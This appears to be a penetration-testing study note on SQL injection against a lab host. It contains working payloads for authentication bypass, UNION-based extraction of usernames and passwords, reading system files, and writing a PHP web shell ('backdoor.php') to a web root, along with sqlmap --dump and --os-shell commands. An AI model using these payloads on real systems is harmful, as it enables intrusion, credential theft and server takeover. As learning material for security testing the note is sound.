# Basic Syntax
For a simple database:
```
+----+------------+--------------+
| id | username   | password     |
+----+------------+--------------+
|  1 | tom.jones  | notunusual   |
```

A simple SELECT query > show me all columns and records in the *users* table
```
SELECT * FROM users;
```

A SELECT query with a conditional clause > show me the username field from the *users* table, showing only records with an *id* of 1
```
SELECT username FROM users WHERE id=1;
```

We can also INSERT, DELETE and UPDATE data in tables.

# Identifying SQL injection vulnerabilities
In order to locate and identify SQL injection vulnerabilities, we need to find locations where data might pass through a database. This can be in authentication forms, or E-commerce sites.

We can use the single quote (') - which is used by SQL as a string delimiter, to be a simple check for potential SQL injection vulnerabilities.

In the case where we might have access to the source code, one such vulnerable SQL query would be the following.
```php
$query = "select * from users where username = '$user' and password = '$pass'";
```

Notice how the submitted parameter values are surrounded in single quotes? When we submit a string containing a single quote, this is what the SQL query would be.
```php
$query = "select * from users where username = ''' and password = 'P@ssw0rd'";
```

The single quote in the username will cause the SQL query to take an empty string ('') as the username, and a resulting misplaced string of ' and password = ', causing a syntax error.


# Authentication Bypass
Using the SQL query code from above, we can abuse the SQL injection vulnerability to bypass authentication by submitting the following value as the username: `tom' or 1=1;#`

This will result in the query becoming:
```
select * from users where name = 'tom' or 1=1;#' and password = 'jones';
```

The `#` character is a comment marker in MySQL/MariaDB, effectively removing the rest of the statement. Essentially, the query now becomes > show me all columns and rows from the *users* table for users with a name of **tom** or where **1=1** (this is always true)

Certain programming languages have functions that query the database and expect a single record, whereby in this case, we are trying to get as many rows as possible, which may result in an error. As such, we can bypass this by changing the query slightly:
```
select * from users where name = 'tom' or 1=1 LIMIT 1;#
```

# Enumerating number of columns
If we do not know how many columns are present in the table, we can also enumerate by using the `order by` statement as follows:
```
select * from users where id = 1 order by X # By changing the values of X, we can reach an error telling us the number of columns present in the table
```

# Understanding the layout
Now that we know the number of columns in the table, we can use a UNION statement to extract more data. UNION statements allow us to add a second select statement to the original query, but the output must return the same number of columns as the original statement.

Instead of looking up values from the table, we can specify literal values to be filled into the table with `union all select 1, 2, 3`. This returns a row with the values 1, 2 and 3.
```
192.168.141.10/debug.php?id=1 union select all 1,2,3
```

![[Pasted image 20221221212300.png]]
Here, we can see that columns 2 and 3 are displayed in the table, so we can use these columns for our exploit.

# Extracting data from the database
Now that we know how many columns are present in the table, and which columns are displayed, we can begin to extract data from the database.

In the following examples, we use commands specific to MariaDB, but other databases offer similar functionality with a slightly different syntax.

**To output the version of MariaDB** `@@version`
```
http://192.168.141.10/debug.php?id=1 union all select 1, 2, @@version
```
![[Pasted image 20221221212927.png]]

**To output current database user** `user()`
```
http://192.168.141.10/debug.php?id=1 union all select 1, 2, user()
```
![[Pasted image 20221221213307.png]]

**To output database information (table name)** `table_name from information_schema.tables`
```
http://192.168.141.10/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
```
![[Pasted image 20221221213437.png]]

**To output column names from table** `column_name from information_schema.columns where table_name='users'`
```
http://192.168.141.10/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
```
![[Pasted image 20221221213542.png]]

**To output specific columns (username, password) from table** `select 1, username, password from users`
```
http://192.168.141.10/debug.php?id=1 union all select 1, username, password from users
```
![[Pasted image 20221221213716.png]]


# From SQL injection to Code Execution
Sometimes, SQL injection vulnerabilities can be used to read and write files to the underlying OS. Writing a carefully crafted file containing PHP code into the root directory of the web server can then be leveraged for full code execution.

**Testing the *load_file* function**
```
http://192.168.141.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```
![[Pasted image 20221221215038.png]]
This outputs the contents of the *hosts* file on the web server.

**Using INTO OUTFILE function to write malicious PHP file to server's web root**
```
http://192.168.141.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```
This will place the file containing our malicious PHP code in the web root, allowing us to use it.

```
http://192.168.141.10/backdoor.php?cmd=ipconfig
```

# Automating SQL injection
We can use a tool that is pre-installed in Kali - *sqlmap* to identify and exploit SQL injection vulnerabilities against various database engines.

```bash
# -u sets the URL to scan
# -p sets the parameter to test

sqlmap -u http://192.168.141.10/debug.php?id=1 -p "id"
```
*sqlmap* issues multiple request to probe if a parameter is vulnerable to SQL injection, and it helps to identify the backend database being used.

We can adjust our command to extract data from the database.
```bash
sqlmap -u http://192.168.141.10/debug.php?id=1 -p "id" --dbms=mysql --dump
```

*sqlmap* also has many other features such as attempting Web Application Firewall (WAF) bypasses, and executing complex queries to automate the complete takeover of a server. Using the *os-shell* parameter will attempt to automatically upload and execute a remote command shell on the target system.
```bash
sqlmap -u http://192.168.141.10/debug.php?id=1 -p "id" --dbms-mysql --os-shell
```
